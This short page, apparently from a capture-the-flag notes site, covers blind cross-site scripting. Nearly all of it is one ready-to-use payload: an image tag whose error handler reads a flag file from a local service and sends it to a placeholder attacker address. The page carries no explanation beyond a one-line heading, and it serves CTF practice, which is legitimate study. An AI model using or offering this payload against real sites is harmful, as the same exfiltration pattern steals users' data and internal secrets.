---
title: Cross Site Scripting (XSS)
sidebar_position: 2
---

## Blind XSS

**Fetching flag where the development runs in the production machine.**

```javascript
<img src="x" 
     onerror="
        fetch('http://127.0.0.1:8080/flag.txt')
        .then(r => r.text())
        .then(x => {
            fetch('http://<ATTACKER_ADDRESS>/?flag=' + encodeURIComponent(x))
        })
    " 
/>
```